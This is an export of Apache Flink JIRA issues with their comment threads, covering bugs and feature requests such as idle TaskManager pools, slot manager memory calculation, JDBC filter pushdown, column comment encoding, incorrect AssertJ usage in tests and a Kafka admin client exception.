Pre-deployed idle Task Managers,FLINK-32255,13538798,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,cbornet,cbornet,05/Jun/23 17:08,31/Aug/23 06:32,04/Jun/24 20:41,31/Aug/23 06:32,,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"In the kubernetes operator, it would be nice to have the possibility to define a number of pre-deployed spare Task Managers. The operator would ensure that there are always a number of ready-to-be-used TMs that can accept new incoming jobs.

The goal would be to reduce the startup time of jobs, especially in the session cluster mode.

See for inspiration  [https://www.decodable.co/blog/flink-deployments-at-decodable] -> Custom Flink Session Clusters for Preview Jobs: ""To further reduce the preview response time, we also modified Flink to pre-deploy some idle TaskManagers. When a TaskManager is used, a new TaskManager is immediately created so there is always a pool of idle TaskManagers.""",,,,,,,,,,,,,,,,,,,,FLINK-32883,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 07 09:02:05 UTC 2023,,,,,,,,,,"0|z1ic4o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 17:57;gyfora;Have you tried this config? https://nightlies.apache.org/flink/flink-docs-master/docs/deployment/config/#slotmanager-redundant-taskmanager-num;;;","05/Jun/23 21:41;cbornet;Thanks a lot. The config looks very interesting. Although it's advertised for recovery, it does seem it could be useful for session clusters.
I'll test it asap and give feedback here whether that works for this.;;;","06/Jun/23 11:56;cbornet;[~gyfora] it's almost what is needed. The only missing part is that the redundant TMs are not started if there are no jobs. Which is understandable as the feature was designed for recovery. But it would be nice to have them started in the case of a session cluster with no jobs to have a fast startup for the first incoming job.

Can something be done about it ?;;;","06/Jun/23 12:35;gyfora;This feature is mostly relevant for the native integration (because in standalone mode the TM number is ""fixed"" anyways). This also means that it would have to be implemented on the Flink side. I think we could change the semantics of this config to start an empty TM always.

I would at least start a short discussion in the dev mailing list to see what others think. Can you do that?;;;","07/Jun/23 09:02;cbornet;Sure. I'll open the discussion.
I don't know if the semantics should be changed since when it's used for fast recovery and not for fast startup, it makes sense to not start TMs when there are no running jobs.
Anyway, let's discuss on the ML.;;;",,,,,,,,,,,,,,,,,,
FineGrainedSlotManager may not allocate enough taskmangers if maxSlotNum is configured,FLINK-32254,13538769,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Weijie Guo,Weijie Guo,Weijie Guo,05/Jun/23 13:04,07/Jun/23 09:01,04/Jun/24 20:41,07/Jun/23 09:01,1.16.0,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Runtime / Coordination,,,,0,pull-request-available,,,"We ran a job with {{slotmanager.number-of-slots.max = 10}}, {{taskmanager.numberOfTaskSlots = 10}} and {{taskmanager.memory.process.size: 24000m}}. The resources of the cluster are sufficient, but no TaskManager can be allocated. It seems that there is a problem with the calculation logic of {{SlotManagerConfiguration#getMaxTotalMem}}. Due to the rounding down of division, the calculated {{MemorySize}} is too small.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 07 09:01:14 UTC 2023,,,,,,,,,,"0|z1iby8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 05:38;huwh;Thanks for reporting this bug. This is definitely a bug. But in this case, 24000/10*10 is also 24000. This does not lose any precision.  Please correct me if I am wrong.;;;","06/Jun/23 05:52;Weijie Guo;[~huwh] In fact, the {{defaultWorkerResourceSpec.getTotalMemSize()}} is used to calculate {{maxTotalMem}}, which is not exactly equal to {{taskmanager.memory.process.size}}.;;;","06/Jun/23 07:30;huwh;Thanks for your clarification. ;;;","07/Jun/23 09:01;Weijie Guo;master(1.18) via a008f25b87130a4320f0c8a46f3f9cd1ad09f503.
release-1.17 via ff52b475d14abbc8b7e6dd1fc19500a18491e78d.
release-1.16 via b5bffa89f4a85ddc561d18452c58dad763bb4035.;;;",,,,,,,,,,,,,,,,,,,
Blocklist unblockResources does not update the pending resource request,FLINK-32253,13538765,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,prabhujoseph,prabhujoseph,prabhujoseph,05/Jun/23 11:29,10/Aug/23 22:35,04/Jun/24 20:41,,1.17.0,,,,,,,,,,,,,,,,,,,,Deployment / Kubernetes,Deployment / YARN,,,0,pull-request-available,stale-assigned,,"Blocklist unblockResources does not update the existing pending resource request from YARN/K8S. It updates only for the new resource requests. The existing pending resource requests are not scheduled on the nodes which are unblocked.

ResourceManager#unblockResources has to notify YarnResourceManagerDriver/KubernetesResourceManagerDriver so that the driver updates the pending resource request. YarnResourceManagerDriver#tryUpdateApplicationBlockList could be called during unblockResources.


",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-28130,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 10 22:35:09 UTC 2023,,,,,,,,,,"0|z1ibxc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 02:57;wanglijie;[~prabhujoseph] Thanks for reporting. I agree with you, it will be a nice improvement to update pending resource request. For Yarn, we can call the {{{}tryUpdateApplicationBlockList{}}}, and do you have any idea on K8S? :);;;","06/Jun/23 05:19;prabhujoseph;Thanks [~wanglijie] for your comment. For K8s, I think {{KubernetesResourceManagerDriver}} could get any pending task manager pods with node affinity notIn set to any of the unblocked nodes and update its pod spec. 


;;;","06/Jun/23 15:28;wanglijie;[~prabhujoseph] I think it can work. Would you like to take this ticket?;;;","06/Jun/23 16:23;prabhujoseph;Yes, sure. Could you assign this ticket to me. Thanks.;;;","07/Jun/23 01:17;wanglijie;Thanks [~prabhujoseph] , assigned to you.;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,
SELECT COUNT(*) will return nothing when source no data return,FLINK-32252,13538747,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,tanjialiang,tanjialiang,05/Jun/23 07:27,06/Jun/23 03:20,04/Jun/24 20:41,06/Jun/23 03:20,jdbc-3.1.0,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,,,," 

mysql source
{code:java}
CREATE TABLE student(
    id int primary key auto_increment,
    name varchar(32),
    age int
);

INSERT INTO student(name, age) VALUES ('tanjl',18),('jark',20),('mike',16),('rose',21);{code}
 

Flink SQL
{code:java}
CREATE TABLE student (
`id` INT PRIMARY KEY,
`name` STRING,
`age` INT
) WITH (
  'connector' = 'jdbc',
  'url' = 'jdbc:mysql://localhost/test?serverTimezone=UTC',
  'username' = 'root',
  'password' = 'root',
  'table-name' = 'student'
); 

SELECT count(*) FROM student WHERE age < 15;{code}
flink will return nothing because jdbc connector push the filter down（after flink-connector-jdbc-3.1.0）, which make source no data return.

 ",,,,,,,,,,,,,,,,,,FLINK-12215,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 03:18:43 UTC 2023,,,,,,,,,,"0|z1ibtc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 11:45;libenchao;The source operator returns 0 rows is expected, does the query return nothing? It should return 1 row for this case.;;;","05/Jun/23 12:12;jark;Were you running in batch mode or streaming mode?;;;","06/Jun/23 02:28;tanjialiang;[~jark] I tried, STREAMING mode return nothing and BATCH mode return 0.;;;","06/Jun/23 02:38;tanjialiang;[~jark] Whether in BATCH mode or STREAMING mode the final reuslts should be consitent? So i think maybe something wrong in STREAMING mode.;;;","06/Jun/23 02:43;jark;[~tanjialiang] That works as expected (by design). Currently, streaming mode assumes the source is unbounded, so it should never return 0. But I agree the semantics are not consistent between batch and streaming. We have FLINK-12215 and FLINK-18365 to track and improve this. ;;;","06/Jun/23 03:18;tanjialiang;[~jark] Got it, thanks.;;;",,,,,,,,,,,,,,,,,
flink jdbc catalog cannot add parameters to url,FLINK-32251,13538742,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,melin,melin,05/Jun/23 06:23,05/Jun/23 12:13,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / JDBC,,,,0,,,,"For example, add an encoding parameter to the mysql url：

jdbc:mysql://host:port/database?useUnicode=true&characterEncoding=UTF-8",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-05 06:23:43.0,,,,,,,,,,"0|z1ibs8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revert the Field name of BUFFER_TIMEOUT to improve compatibility,FLINK-32250,13538729,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fanrui,fanrui,fanrui,05/Jun/23 05:07,06/Jun/23 02:24,04/Jun/24 20:41,06/Jun/23 02:24,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,API / DataStream,,,,0,pull-request-available,,,"FLINK-32023 changed the `ExecutionOptions.BUFFER_TIMEOUT` to `ExecutionOptions.BUFFER_TIMEOUT_INTERVAL`, the filed name should be reverted.

Because the `ExecutionOptions` is a public evolving API, some flink users are using the `ExecutionOptions.BUFFER_TIMEOUT` in their code. If we update it, the code cannot upgrade to 1.18 directly.

 

BTW, the option name is changed from `execution.buffer-timeout` to `execution.buffer-timeout.interval`. However, we marked the `execution.buffer-timeout` as `DeprecatedKeys`. So 1.18 is compatible with the old option name.

 ",,,,,,,,,,,,,,,,,,,,,FLINK-32023,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 02:24:05 UTC 2023,,,,,,,,,,"0|z1ibpc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 02:24;fanrui;<master:1.18> 7403e2efea273c307e52475d56c10910ca940430;;;",,,,,,,,,,,,,,,,,,,,,,
A Java string should be used instead of a Calcite NlsString to construct the column comment of CatalogTable,FLINK-32249,13538706,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lincoln.86xy,lincoln.86xy,lincoln.86xy,04/Jun/23 15:38,06/Jun/23 00:53,04/Jun/24 20:41,06/Jun/23 00:53,1.17.1,,,,,,,,,,,,,,1.17.2,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"when Flink interacts with CatalogTable, it directly passes the Calcite's NlsString comment as a string to the comment attribute of the schema and column. In theory, a Java string should be passed here, otherwise the CatalogTable implementers may encounter special character encoding issues, e.g., an issue in apache paimon: [https://github.com/apache/incubator-paimon/issues/1262]

also tested in sql-client:

{code}

Flink SQL> CREATE TABLE s1 (
>     order_id    STRING comment '测试中文',
>     price       DECIMAL(32,2) comment _utf8'测试_utf8中文',
>     currency    STRING,
>     order_time  TIMESTAMP(3)
> ) comment '测试中文table comment' WITH ('connector'='dategen');
[INFO] Execute statement succeed.

Flink SQL> show tables;
+------------+
| table name |
+------------+
|         s1 |
+------------+
1 row in set

Flink SQL> desc s1;
+------------+----------------+------+-----+--------+-----------+-------------------------+
|       name |           type | null | key | extras | watermark |                 comment |
+------------+----------------+------+-----+--------+-----------+-------------------------+
|   order_id |         STRING | TRUE |     |        |           | u&'\6d4b\8bd5\4e2d\6587 |
|      price | DECIMAL(32, 2) | TRUE |     |        |           |     _UTF8'测试_utf8中文 |
|   currency |         STRING | TRUE |     |        |           |                         |
| order_time |   TIMESTAMP(3) | TRUE |     |        |           |                         |
+------------+----------------+------+-----+--------+-----------+-------------------------+
4 rows in set

Flink SQL> show create table s1;
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|                                                                                                                                                                                                                                                   result |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| CREATE TABLE `default_catalog`.`default_database`.`s1` (
  `order_id` VARCHAR(2147483647),
  `price` DECIMAL(32, 2),
  `currency` VARCHAR(2147483647),
  `order_time` TIMESTAMP(3)
) COMMENT '测试中文table comment'
WITH (
  'connector' = 'dategen'
)
 |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set

{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Jun/23 13:21;lincoln.86xy;1.17-problematic-to-string.png;https://issues.apache.org/jira/secure/attachment/13058785/1.17-problematic-to-string.png","05/Jun/23 13:22;lincoln.86xy;1.18-proper-to-string.png;https://issues.apache.org/jira/secure/attachment/13058786/1.18-proper-to-string.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 00:52:55 UTC 2023,,,,,,,,,,"0|z1ibk8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 05:10;aitozi;It does not reproduce in my local sql client


{code:java}
Flink SQL> CREATE TABLE s1 (
>      order_id    STRING comment '测试中文',
>      price       DECIMAL(32,2) comment _utf8'测试_utf8中文',
>      currency    STRING,
>      order_time  TIMESTAMP(3)
>  ) comment '测试中文table comment' WITH ('connector'='dategen');
[INFO] Execute statement succeed.

Flink SQL> 
> show create table s1;
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|                                                                                                                                                                                                                                                                                              result |
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| CREATE TABLE `default_catalog`.`default_database`.`s1` (
  `order_id` VARCHAR(2147483647) COMMENT '测试中文',
  `price` DECIMAL(32, 2) COMMENT '测试_utf8中文',
  `currency` VARCHAR(2147483647),
  `order_time` TIMESTAMP(3)
) COMMENT '测试中文table comment'
WITH (
  'connector' = 'dategen'
)
 |
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set

Flink SQL> desc s1;
+------------+----------------+------+-----+--------+-----------+---------------+
|       name |           type | null | key | extras | watermark |       comment |
+------------+----------------+------+-----+--------+-----------+---------------+
|   order_id |         STRING | TRUE |     |        |           |      测试中文 |
|      price | DECIMAL(32, 2) | TRUE |     |        |           | 测试_utf8中文 |
|   currency |         STRING | TRUE |     |        |           |               |
| order_time |   TIMESTAMP(3) | TRUE |     |        |           |               |
+------------+----------------+------+-----+--------+-----------+---------------+
4 rows in set

Flink SQL> 

{code}


;;;","05/Jun/23 11:39;libenchao;[~aitozi] This should only affect 1.7.x, you can try with 1.7.1;;;","05/Jun/23 12:28;lincoln.86xy;[~aitozi] it can be reproduced in 1.17.0 and 1.17.1, but works in current master branch, so the fix version might be 1.17.2;;;","05/Jun/23 13:29;lincoln.86xy;The `col.getComment().get().toString()` causes this problem:  
!1.17-problematic-to-string.png! 

while in master branch, it was fixed by removing the related code, and the `MergeTableLikeUtil#appendDerivedColumns` works fine: 
 !1.18-proper-to-string.png! 

we can have a quick fix on 1.17 that just change the problematic toString logic which will minimize the change.;;;","06/Jun/23 00:52;lincoln.86xy;fixed in 1.17: 7c2631b8ba8c935be03c91fd44b7aa42937a9698;;;",,,,,,,,,,,,,,,,,,
Incorrect AssertJ usage,FLINK-32248,13538676,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,yyhx,Marcono1234,Marcono1234,03/Jun/23 13:09,17/Aug/23 22:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / Web Frontend,Tests,,,0,pull-request-available,stale-assigned,,"Flink uses AssertJ incorrectly:
- Multiple tests call AssertJ's {{withFailMessage}} at the end, for example something like this:
{code}
assertThat(...)
    ...()
    .withFailMessage(""Some message"");
{code}
However, the [{{withFailMessage}} documentation|https://www.javadoc.io/doc/org.assertj/assertj-core/latest/org/assertj/core/api/AbstractAssert.html#withFailMessage(java.lang.String,java.lang.Object...)] says:
{quote}
You must set it *before* calling the assertion otherwise it is ignored as the failing assertion breaks the chained call by throwing an AssertionError. 
{quote}
This can be seen for example with the following code where the custom message is ignored:
{code}
 assertThat(false).isTrue().withFailMessage(""Some message"");
{code}
There are 20+ cases of this in the Flink code so I am not going to list them here, hoping that it is easier to find them yourself. Though please let me know if I should list them here.

- No assertion being performed by {{WebFrontendITCase}}. There are (currently) three cases where accidentally no call is made on the {{assertThat}} return value. For example something like this:
{code}
assertThat(list.isEmpty());
// Should instead be
assertThat(list).isEmpty();
{code}
-- https://github.com/apache/flink/blob/bfe49b2973d4ffc8f7404a376cab1e419b53406a/flink-runtime-web/src/test/java/org/apache/flink/runtime/webmonitor/WebFrontendITCase.java#L302-L302
-- https://github.com/apache/flink/blob/bfe49b2973d4ffc8f7404a376cab1e419b53406a/flink-runtime-web/src/test/java/org/apache/flink/runtime/webmonitor/WebFrontendITCase.java#L372-L372
-- https://github.com/apache/flink/blob/bfe49b2973d4ffc8f7404a376cab1e419b53406a/flink-runtime-web/src/test/java/org/apache/flink/runtime/webmonitor/WebFrontendITCase.java#L416-L416

I found those because AssertJ is luckily using {{@CheckReturnValue}} on their API. I assume SpotBugs, Error Prone or IntelliJ IDEA might have found these issues as well, in case you want to investigate integrating automatic detection of such errors.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 17 22:35:06 UTC 2023,,,,,,,,,,"0|z1ibdk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 07:57;Weijie Guo;[~Marcono1234] Thanks for reporting this, would you mind opening a pull request to fix this?;;;","07/Jun/23 09:03;yyhx;Hi, [~Weijie Guo] , cloud you assign this to me?;;;","07/Jun/23 09:05;Weijie Guo;[~yyhx] Sure, thanks for picking up this. I will assign this to you due to the lack of response from the reporter.;;;","17/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,
Normal group by with time attributes after a window group by is interpreted as GlobalWindowAggregate,FLINK-32247,13538561,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,renqs,renqs,02/Jun/23 10:08,02/Jun/23 10:17,04/Jun/24 20:41,,1.16.2,1.17.1,1.18.0,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,,,,"Considering a SQL statement below:
{code:java}
CREATE TABLE source1 (
    `id` BIGINT,
    `item` STRING,
    `price` DOUBLE,
    `ts` STRING,
    `rowtime` AS TO_TIMESTAMP(`ts`),
    WATERMARK FOR rowtime AS rowtime - INTERVAL '5' SECOND) 
WITH (
    'connector' = 'datagen'
);

SELECT `window_start`, `window_end`, `window_time`, COUNT(*) FROM (
    SELECT `window_start`, `window_end`, `window_time`, `item`, SUM(`price`) AS `price_sum` FROM
            TABLE (TUMBLE(TABLE source1, DESCRIPTOR(`rowtime`), INTERVAL '1' MINUTES))
    GROUP BY `window_start`, `window_end`, `window_time`, `item`) 
GROUP BY `window_start`, `window_end`, `window_time`; /* Use time attributes defined in the previous window aggregation as grouping keys */{code}
which should be a group aggregation after a window aggregation, but the planner is interpreting the latter aggregation as a GroupWindowAggregation:
{code:java}
== Optimized Physical Plan ==
Calc(select=[window_start, window_end, window_time, EXPR$3])
+- GlobalWindowAggregate(window=[TUMBLE(win_end=[$window_end], size=[1 min])], select=[COUNT(count1$0) AS EXPR$3, start('w$) AS window_start, end('w$) AS window_end, rowtime('w$) AS window_time])
   +- Exchange(distribution=[single])
      +- LocalWindowAggregate(window=[TUMBLE(win_start=[window_start], win_end=[window_end], size=[1 min])], select=[COUNT(*) AS count1$0, slice_end('w$) AS $window_end])
         +- Calc(select=[window_start, window_end, window_time])
            +- GlobalWindowAggregate(groupBy=[item], window=[TUMBLE(slice_end=[$slice_end], size=[1 min])], select=[item, start('w$) AS window_start, end('w$) AS window_end, rowtime('w$) AS window_time])
               +- Exchange(distribution=[hash[item]])
                  +- LocalWindowAggregate(groupBy=[item], window=[TUMBLE(time_col=[rowtime], size=[1 min])], select=[item, slice_end('w$) AS $slice_end])
                     +- WatermarkAssigner(rowtime=[rowtime], watermark=[-(rowtime, 5000:INTERVAL SECOND)])
                        +- Calc(select=[item, price, TO_TIMESTAMP(ts) AS rowtime])
                           +- TableSourceScan(table=[[default_catalog, default_database, source1]], fields=[id, item, price, ts]) {code}
The trick is that the latter group aggregation uses time attributes defined in the previous window aggregation as grouping keys.

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 02 10:17:39 UTC 2023,,,,,,,,,,"0|z1iao0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"02/Jun/23 10:17;renqs;Not sure if this is by-design or a bug in planner;;;",,,,,,,,,,,,,,,,,,,,,,
javax.management.InstanceAlreadyExistsException,FLINK-32246,13538525,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,jeff-zou,jeff-zou,02/Jun/23 06:47,03/Jun/23 11:19,04/Jun/24 20:41,,1.15.2,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,"Flink SQL throws an exception(javax.management.InstanceAlreadyExistsException) when trying to perform multiple sink operations on the same kafka source .

 

sql example:
{code:java}
create table kafka_source() with ('connector'='kafka');
insert into sink_table1 select * from kafka_source;
insert into sink_table2 select * from kafka_source; {code}
The Exception as below:
{code:java}
javax.management.InstanceAlreadyExistsException: kafka.admin.client:type=app-info,id=*****
 java.management/com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:436)
 java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerWithRepository(DefaultMBeanServerInterceptor.java:1855)
 java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:955)
 java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:890)
 java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:320)
 java.management/com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:522)
 org.apache.kafka.common.utils.AppInfoParser.registerAppInfo(AppInfoParser.java:64)
 org.apache.kafka.clients.admin.KafkaAdminClient.<init>(KafkaAdminClient.java:500)
 org.apache.kafka.clients.admin.KafkaAdminClient.createInternal(KafkaAdminClient.java:444)
 org.apache.kafka.clients.admin.Admin.create(Admin.java:59)
 org.apache.kafka.clients.admin.AdminClient.create(AdminClient.java:39)
 org.apache.flink.connector.kafka.source.enumerator.KafkaSourceEnumerator.getKafkaAdminClient(KafkaSourceEnumerator.java:410)
 org.apache.flink.connector.kafka.source.enumerator.KafkaSourceEnumerator.start(KafkaSourceEnumerator.java:151)
 org.apache.flink.runtime.source.coordinator.SourceCoordinator.lambda$start$1(SourceCoordinator.java:209)
 org.apache.flink.runtime.source.coordinator.SourceCoordinator.lambda$runInEventLoop$9(SourceCoordinator.java:406)
 org.apache.flink.util.ThrowableCatchingRunnable.run(ThrowableCatchingRunnable.java:40)
 java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
 java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
 java.base/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:304)
 java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
 java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
 java.base/java.lang.Thread.run(Thread.java:829) {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jun 03 08:52:00 UTC 2023,,,,,,,,,,"0|z1iag0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"02/Jun/23 09:52;aitozi;where do you run this sql ? sql-client ? Can you provide a demo case to reproduce this ?;;;","03/Jun/23 08:52;jeff-zou;[~aitozi]  No, It's run in the Native Kubernates.

The code like below:
{code:java}
StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
StreamTableEnvironment tEnv = StreamTableEnvironment.create(env);
tEnv.executeSql(""create table kafka_source() with ('connector'='kafka')""); 
tEnv.executeSql(""insert into sink_table1 select * from kafka_source;""); 
TableResult tableResult= tEnv.executeSql(""insert into sink_table2 select * from kafka_source;""); 
tableResult.getJobClient().get().getJobExecutionResult().get();

{code};;;",,,,,,,,,,,,,,,,,,,,,
NonDeterministicTests #testTemporalFunctionsInBatchMode failure masked due to incorrect test initialization,FLINK-32245,13538496,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,qingyue,qingyue,qingyue,02/Jun/23 02:13,02/Jun/23 13:05,04/Jun/24 20:41,02/Jun/23 13:05,1.17.1,1.18.0,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"The test case NonDeterministicTests #testTemporalFunctionsInBatchMode has been consistently failing due to incorrect test initialization.

 

However, this failure has been masked because the test class name ends with ""Tests"", causing the CI to skip the test case, which has been further validated by searching through the historical logs of the CI.

This issue needs to be addressed, and the test case should be executed to ensure proper testing. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 02 13:05:42 UTC 2023,,,,,,,,,,"0|z1ia9s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"02/Jun/23 13:05;lincoln.86xy;fixed in master: bfe49b2973d4ffc8f7404a376cab1e419b53406a;;;",,,,,,,,,,,,,,,,,,,,,,
flink-master-benchmarks-regression-check always fails since 2023.05.30,FLINK-32244,13538495,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Yanfei Lei,wanglijie,wanglijie,02/Jun/23 02:09,07/Jun/23 08:16,04/Jun/24 20:41,05/Jun/23 13:05,1.18.0,,,,,,,,,,,,,,,,,,,,Benchmarks,,,,0,pull-request-available,,,"Since 2023.05.30, the flink-master-benchmarks-regression-check always fail:

[http://codespeed.dak8s.net:8080/job/flink-master-benchmarks-regression-check/1631|http://codespeed.dak8s.net:8080/job/flink-master-benchmarks-regression-check/1631/]

[http://codespeed.dak8s.net:8080/job/flink-master-benchmarks-regression-check/1632|http://codespeed.dak8s.net:8080/job/flink-master-benchmarks-regression-check/1631/]

